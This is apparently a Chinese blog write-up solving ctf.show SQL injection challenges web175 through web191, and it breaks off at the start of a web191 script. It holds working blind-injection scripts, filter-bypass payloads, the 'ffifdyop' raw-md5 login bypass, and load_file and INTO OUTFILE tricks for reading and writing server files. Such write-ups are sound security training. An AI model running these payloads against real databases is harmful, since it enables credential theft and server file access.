<h1 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407124216316.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407124216316"></p>

<p>这次是直接没有回显了</p>
<h2 id="get时间盲注无空格和逗号的脚本"><a href="#get时间盲注无空格和逗号的脚本" class="headerlink" title="get时间盲注无空格和逗号的脚本"></a>get时间盲注无空格和逗号的脚本</h2><p>稍微修改一下</p>
<pre><code class="python">import requests
def get_pwd_len(url):
    head = 1
    tail = 100
    ans = 0
    while head &lt; tail:
        mid = (head + tail ) &gt;&gt; 1
        payload = f&quot;1&#39;&amp;&amp;if(length((select(password)from(ctfshow_user5)where(id=26)))&gt;&#123;mid&#125;,sleep(2),0)#&quot;
        # print(uname)
        param = &#123;
            &#39;id&#39;: payload,
            &#39;page&#39;: &#39;1&#39;,
            &#39;limit&#39;: &#39;10&#39;
        &#125;
        res = requests.get(url=url,params=param)
        try:
            r = requests.get(url,params=param,timeout=0.5)
            tail = mid
            ans = mid
        except Exception as e :
            head = mid +1
    print(ans)

        # passwd长度为:45
url=&quot;http://c7c6c7b5-e27e-46b5-ac09-66d7f0ede948.challenge.ctf.show/api/v5.php&quot;
get_pwd_len(url)


def get_pwd(url):
    ans = &quot;&quot;
    for i in range(1, 46):
        # print(i)
        j = 46 - i
        # print(j)
        head = 32
        tail = 127
        while head &lt;tail:
            mid = (head + tail) &gt;&gt; 1 #&gt;&gt;是位移运算符 右移一位就是除以二
            payload = f&quot;1&#39;&amp;&amp;if(ascii(substr((reverse(substr((select(password)from(ctfshow_user5)where(id=26))from(&#123;i&#125;))))from(&#123;j&#125;)))&gt;&#123;mid&#125;,sleep(2),0)#&quot;
            # print(uname)
            param = &#123;
                &#39;id&#39;: payload,
                &#39;page&#39;: &#39;1&#39;,
                &#39;limit&#39;: &#39;10&#39;
            &#125;
            try:
                res = requests.get(url=url,params=param,timeout=0.5)
                tail = mid
            except Exception as e:
                head = mid + 1

        if head != 32:
            ans += chr(head)
        else:
            break
        print(ans)
url=&quot;http://c7c6c7b5-e27e-46b5-ac09-66d7f0ede948.challenge.ctf.show/api/v5.php&quot;
get_pwd(url)
</code></pre>
<p>这里有逗号,等研究研究在试试能不能去掉逗号</p>
<p>这里当然也可以写文件</p>
<pre><code>/api/v5.php?id=1&#39; union select 1,password from ctfshow_user5 into outfile &#39;/var/www/html/1.txt&#39;--+&amp;page=1&amp;limit=10
</code></pre>
<h1 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130600142.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407130600142"></p>

<pre><code>-1&#39; or 1%23
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130612382.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407130612382"></p>

<p>不知道过滤了啥</p>
<p>这里之前的不可以,但是大小写可以绕过</p>
<pre><code>-1&#39;uNion seleCt 1,groUp_concAt(username,password),3 frOm ctfshow_user%23
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407130913425.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407130913425"></p>

<h1 id="web177-179"><a href="#web177-179" class="headerlink" title="web177-179"></a>web177-179</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407131027613.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407131027613"></p>

<h2 id="空格的代替"><a href="#空格的代替" class="headerlink" title="空格的代替"></a>空格的代替</h2><pre><code>-1&#39;%09or%091%23    TAB水平
-1&#39;%0aor%0a1%23    新建一行
-1&#39;%0cor%0c1%23    新建一页
-1&#39;%0dor%0d1%23    return功能
-1&#39;%0bor%0b1%23    TAB(垂直)
%a0             空格 这里不行
</code></pre>
<p>注释</p>
<pre><code>-1&#39;union/**/select/**/1,group_concat(username,password),3/**/from/**/ctfshow_user%23
</code></pre>
<p>括号</p>
<p>我也不会,自己研究怎么加括号吧</p>
<pre><code>-1&#39;union(select(1),(group_concat(username,password)),(3)from(ctfshow_user))%23
</code></pre>
<p>反引号</p>
<p>我不懂但是可以实现</p>
<pre><code>-1&#39;union/**/select`id`,`username`,`password`from`ctfshow_user`%23
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407131136762.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407131136762"></p>

<h1 id="web180-183"><a href="#web180-183" class="headerlink" title="web180-183"></a>web180-183</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407135553899.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407135553899"></p>

<h2 id="过滤注释符与空格"><a href="#过滤注释符与空格" class="headerlink" title="过滤注释符与空格"></a>过滤注释符与空格</h2><p>联合注入好像无法实现,反正我不会,如果没过滤其他空格可以实现</p>
<pre><code>-1&#39;union%0cselect(1),(group_concat(username,password)),(3)from(ctfshow_user)where(1)and&#39;1
</code></pre>
<pre><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407140553761.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407140553761"></p>

<h1 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407141724604.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407141724604"></p>

<pre><code>//拼接sql语句查找指定ID用户
  $sql = &quot;select count(pass) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;
  
  //对传入的参数进行了过滤
  function waf($str)&#123;
    return preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#39;, $str);
  &#125;
  
//返回用户表的记录总数
      $user_count = 0;
</code></pre>
<h2 id="regexp匹配like通配pwd"><a href="#regexp匹配like通配pwd" class="headerlink" title="regexp匹配like通配pwd"></a>regexp匹配like通配pwd</h2><pre><code class="python">import requests

def post_pwd(url):
    dic=r&#39;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&#39;
    ans =&#39;&#39;
    for i in range(1,46):
        for j in  dic:
            #flag=&quot;ctfshow&#123;&quot;
            #payload = f&quot;(ctfshow_user)where(pass)like&#39;&#123;flag+j&#125;%&#39;
            payload =f&quot;(ctfshow_user)where(substr(pass,&#123;i&#125;,1))regexp(&#39;&#123;j&#125;&#39;)&quot;
            data = &#123;
                &#39;tableName&#39;:payload
            &#125;
            r = requests.post(url,data=data)
            if r.text.find(&quot;$user_count = 1;&quot;) &gt; 0:
                ans += j
                print(ans)
                break

url = &#39;http://a4c677e5-0ca4-46f8-85da-961e108b532b.challenge.ctf.show/select-waf.php&#39;
post_pwd(url)
</code></pre>
<h1 id="web184-1"><a href="#web184-1" class="headerlink" title="web184"></a>web184</h1><pre><code class="php"> Author:feng
import requests

url=&quot;http://419f0650-7493-4fa7-81fe-82e04b0b6b7c.challenge.ctf.show/select-waf.php&quot;
flag=&quot;ctfshow&#123;&quot;

def str_to_hex(s):
    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;,&#39;&#39;) for c in s])
for i in range(0,100):
    for j in &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;:
        data=&#123;
#&#39;tableName&#39;:&quot;ctfshow_user a inner join ctfshow_user b on b.pass like &#123;&#125;&quot;.format(&quot;0x&quot;+str_to_hex(flag+j+&quot;%&quot;))
            &#39;tableName&#39;:f&quot;ctfshow_user group by pass having pass like &#123;&#39;0x&#39;+str_to_hex(flag+j+&#39;%&#39;)&#125;&quot;
        &#125;
        r=requests.post(url=url,data=data).text
        if &quot;$user_count = 1&quot; in r:
            flag+=j
            print(flag)
            if j==&#39;&#125;&#39;:
                exit()
            break
</code></pre>
<p>HAVING语句通常与GROUP BY语句联合使用，用来过滤由GROUP BY语句返回的记录集。<br> HAVING语句的存在弥补了WHERE关键字不能与聚合函数联合使用的不足。</p>
<pre><code class="python"> Author:Y4tacker
import requests

url = &quot;http://419f0650-7493-4fa7-81fe-82e04b0b6b7c.challenge.ctf.show/select-waf.php&quot;

flag = &#39;ctfshow&#123;&#39;
for i in range(45):
    if i &lt;= 8:
        continue
    for  j in range(127):
        data = &#123;
            &quot;tableName&quot;: f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;i&#125;,1)regexp(char(&#123;j&#125;)))&quot;
        &#125;
        r = requests.post(url,data=data)
        if r.text.find(&quot;$user_count = 43;&quot;)&gt;0:
            if chr(j) != &quot;.&quot;:
                flag += chr(j)
                print(flag.lower())
                if chr(j) == &quot;&#125;&quot;:
                    exit(0)
                break
</code></pre>
<p>RIGHT JOIN等同于RIGHT OUTER JOIN，右外连接，不满足ON条件的会保留右边那张表的数据，左边表数据直接显示NULL</p>
<h1 id="web185-186"><a href="#web185-186" class="headerlink" title="web185-186"></a>web185-186</h1><p>数字的表示哦</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407150732592.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407150732592"></p>

<pre><code class="python"> Author:Y4tacker
import requests

url = &quot;http://bdd55ead-f197-4ec4-b304-8bf0dd687c8d.challenge.ctf.show/select-waf.php&quot;

flag = &#39;ctfshow&#123;&#39;


def createNum(n):
    num = &#39;true&#39;
    if n == 1:
        return &#39;true&#39;
    else:
        for i in range(n - 1):
            num += &quot;+true&quot;
    return num


for i in range(45):
    if i &lt;= 8:
        continue
    for j in range(127):
        data = &#123;
            &quot;tableName&quot;: f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;createNum(i)&#125;,&#123;createNum(1)&#125;)regexp(char(&#123;createNum(j)&#125;)))&quot;
        &#125;
        r = requests.post(url, data=data)
        if r.text.find(&quot;$user_count = 43;&quot;) &gt; 0:
            if chr(j) != &quot;.&quot;:
                flag += chr(j)

                print(flag.lower())
                if chr(j) == &quot;&#125;&quot;:
                    exit(0)
                break
</code></pre>
<h1 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407153242084.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407153242084"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407153406158.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407153406158"></p>

<h2 id="pwd的md5"><a href="#pwd的md5" class="headerlink" title="pwd的md5"></a>pwd的md5</h2><pre><code>md5(string,raw)     
参数    描述
string    必需。要计算的字符串。
raw    
可选。
    默认不写为FALSE。32位16进制的字符串
    TRUE。16位原始二进制格式的字符串
</code></pre>
<p> 这里需要注意的是，当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种。</p>
<p>上面的’ffifdyop‘字符串对应的16位原始二进制的字符串就是”    ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c    “  。  ‘  \  ‘后面的3个字符连同’  \  ‘算一个字符，比如’    \xc9    ‘，所以上述一共16个。当然，像’    \xc9    ‘这种字符会显示乱码。</p>
<p> 这里32位的16进制的字符串，两个一组就是上面的16位二进制的字符串。比如27，这是16进制的，先要转化为10进制的，就是39，39在ASC码表里面就是’    ‘    ‘字符。6f就是对应‘    o    ’。</p>
<pre><code>   然后我们得到的sql语句就是 SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&#39;or&#39;6�]��!r,��b&#39;

   为什么password = &#39;&#39;or&#39;6�]��!r,��b&#39;的返回值会是true呢，因为or后面的单引号里面的字符串（6�]��!r,��b），是数字开头的。当然不能以0开头。（我不知道在数据库里面查询的时候，�这种会不会显示）

   这里引用一篇文章，连接在下面，里面的原话“a string starting with a 1 is cast as an integer when used as a boolean.“

  在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。

   当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）

 所以到这里为止，就完成了sql注入。同时要注意的是，这种sql语句，在mysql里面是可以行得通的，但是在oracle数据库里面这样的语句是有语法错误的。

   所以回过头来为什么ffifdyop就是答案，因为ffifdyop的md5的原始二进制字符串里面有‘or’6这一部分的字符。那么进一步思考这个单引号是否是必要的，这两个单引号是为了与原有的语句的单引号配对。所以我们理解了这个sql注入的原理，那么就明白了我们需要怎样的字符串。
</code></pre>
<h1 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407153535740.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407153535740"></p>

<p>这条语句可以查出所有数据</p>
<pre><code>SELECT * FROM users where username = 1&lt;1 and password = 0
SELECT * FROM users where username = 0 and password = 0
</code></pre>
<p>在where username&#x3D;0这样的查询中,因为username都是字符串,在mysql中字符串与数字进行比较适合,以字母开头的字符串都会转换成数字0,因此这个where可以把所有以字母开头的数据查出来</p>
<pre><code class="php">if($row[&#39;pass&#39;]==intval($password))&#123;
</code></pre>
<p>这里的查询密码是弱类型,查出来的passwd也是以字母开头的,所以password&#x3D;0可以成功弱类型比较</p>
<p>这样也可以查到</p>
<pre><code>select * from referers where referer = &#39;http://127.0.0.1/sqlilabs/Less-19/&#39; and referer = 1;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407154415679.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407154415679"></p>

<pre><code> SELECT password FROM users where username = 1||1 and password = 12;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407154509937.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407154509937"></p>

<pre><code>username=1&lt;1&amp;password=0
username=0&amp;password=0
username=1||1&amp;password=0
</code></pre>
<h1 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407155009165.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407155009165"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407155019582.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220407155019582"></p>

<h2 id="load-file-函数盲注文件"><a href="#load-file-函数盲注文件" class="headerlink" title="load_file()函数盲注文件"></a>load_file()函数盲注文件</h2><pre><code class="python"> Author:feng
import requests

url=&quot;http://356200d4-1b3a-4eff-818f-9c21ccbf8214.challenge.ctf.show/api/index.php&quot;

flag=&quot;ctfshow&#123;&quot;
for i in range(0,100):
    for j in &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;:
        payload=&quot;if((load_file(&#39;/var/www/html/api/index.php&#39;))regexp(&#39;&#123;&#125;&#39;),0,1)&quot;.format(flag+j)
        data=&#123;
            &#39;username&#39;:payload,
            &#39;password&#39;:1
        &#125;
        r=requests.post(url=url,data=data)
        if &quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in r.text:
            flag+=j
            print(flag)
            if j==&#39;&#125;&#39;:
                exit()
            break
</code></pre>
<pre><code class="python"># Author：Y4tacker
import requests

url = &quot;http://3d54cb5b-69e8-4592-85b3-662e3aa01ea5.chall.ctf.show/api/&quot;


def getFlagIndex():
    head = 1
    tail = 300
    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        data = &#123;
            &#39;username&#39;: &quot;if(locate(&#39;flag&#123;&#39;,&quot; + &quot;load_file(&#39;/var/www/html/api/index.php&#39;))&gt;&#123;0&#125;,0,1)&quot;.format(str(mid)),
            &#39;password&#39;: &#39;1&#39;
        &#125;
        r = requests.post(url, data=data)
        if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:
            head = mid + 1
        else:
            tail = mid
    return mid


def getFlag(num):
    i = int(num)
    result = &quot;&quot;
    while 1:
        head = 32
        tail = 127

        i = i + 1
        while head &lt; tail:
            mid = (head + tail) &gt;&gt; 1
            data = &#123;
                &#39;username&#39;: &quot;if(ascii(substr(load_file(&#39;/var/www/html/api/index.php&#39;),&#123;0&#125;,1))&gt;&#123;1&#125;,0,1)&quot;.format(str(i),
                                                                                                               str(
                                                                                                                   mid)),
                &#39;password&#39;: &#39;1&#39;
            &#125;
            r = requests.post(url, data=data)
            if &quot;密码错误&quot; == r.json()[&#39;msg&#39;]:
                head = mid + 1
            else:
                tail = mid
            mid += 1
        if head != 32:
            result += chr(head)
            print(result)
        else:
            break


if __name__ == &#39;__main__&#39;:
    index = getFlagIndex()
    getFlag(index)

</code></pre>
<h1 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h1><h2 id="无过滤盲注"><a href="#无过滤盲注" class="headerlink" title="无过滤盲注"></a>无过滤盲注</h2><pre><code class="python"> Author:Y4tacker
import requests

url = &quot;http://87a2c8d4-69ca-4617-b96c-ce3601bdc1a6.challenge.ctf.show/api/&quot;

result = &quot;&quot;
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # 查数据库 ctfshow_fl0g
        #payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
        # 查字段 id,f1ag
        #payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&quot;
        # 查flag
        payload = &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;
        data = &#123;
            &#39;username&#39;: f&quot;admin&#39; and if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)=&#39;1&quot;,
            &#39;password&#39;: &#39;1&#39;
        &#125;

        r = requests.post(url,data=data)
        if &quot;密码错误&quot;  == r.json()[&#39;msg&#39;]:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)


</code></pre>
<h1 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h1><h2 id="ord函数盲注"><a href="#ord函数盲注" class="headerlink" title="ord函数盲注"></a>ord函数盲注</h2><pre><code class="python"> Author:Y4tacker
import requests

